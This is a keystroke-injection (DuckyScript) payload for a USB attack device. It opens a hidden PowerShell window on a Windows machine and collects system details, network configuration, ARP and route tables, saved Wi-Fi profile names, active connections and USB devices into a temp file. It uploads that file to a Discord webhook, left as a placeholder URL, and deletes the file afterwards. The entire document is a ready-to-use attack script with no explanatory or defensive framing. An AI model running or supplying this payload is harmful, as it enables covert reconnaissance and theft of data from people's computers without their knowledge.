DELAY 500
GUI r
DELAY 200
STRING powershell -WindowStyle Hidden -Command "$f=$env:TEMP+'\recon.txt'; '=== SYSTEM INFO ===' | Out-File $f; '' | Out-File $f -Append; 'Hostname: '+$env:COMPUTERNAME | Out-File $f -Append; 'User: '+$env:USERNAME | Out-File $f -Append; 'OS: '+(Get-CimInstance Win32_OperatingSystem).Caption | Out-File $f -Append; 'Arch: '+$env:PROCESSOR_ARCHITECTURE | Out-File $f -Append; 'CPU: '+(Get-CimInstance Win32_Processor).Name | Out-File $f -Append; 'RAM: '+[Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)+' GB' | Out-File $f -Append; '' | Out-File $f -Append; '=== NETWORK INFO ===' | Out-File $f -Append; '' | Out-File $f -Append; 'Local IPs:' | Out-File $f -Append; (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | ForEach-Object {'  - '+$_.IPAddress+' ('+$_.InterfaceAlias+')'}) -join \"`n\" | Out-File $f -Append; '' | Out-File $f -Append; 'Public IP: '+(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content | Out-File $f -Append; '' | Out-File $f -Append; '=== ADAPTERS ===' | Out-File $f -Append; ipconfig /all | Out-File $f -Append; '' | Out-File $f -Append; '=== ARP TABLE ===' | Out-File $f -Append; arp -a | Out-File $f -Append; '' | Out-File $f -Append; '=== WIFI ===' | Out-File $f -Append; netsh wlan show profiles | Out-File $f -Append; '' | Out-File $f -Append; '=== ROUTES ===' | Out-File $f -Append; route print | Out-File $f -Append; '' | Out-File $f -Append; '=== DNS ===' | Out-File $f -Append; Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, ServerAddresses | Format-Table -AutoSize | Out-String | Out-File $f -Append; '' | Out-File $f -Append; '=== ACTIVE CONNECTIONS ===' | Out-File $f -Append; netstat -ano | Out-File $f -Append; '' | Out-File $f -Append; '=== USB DEVICES ===' | Out-File $f -Append; Get-PnpDevice -Class USB | Select-Object Status, Class, FriendlyName, InstanceId | Format-Table -AutoSize | Out-String | Out-File $f -Append; $w='YOUR_DISCORD_WEBHOOK_URL'; $msg=@{username='Recon Bot'; content='System & Network Recon from '+$env:COMPUTERNAME}|ConvertTo-Json -Compress; Invoke-RestMethod $w -Method Post -ContentType 'application/json' -Body $msg; Invoke-RestMethod $w -Method Post -Form @{file=Get-Item $f}; Remove-Item $f -Force"
ENTER
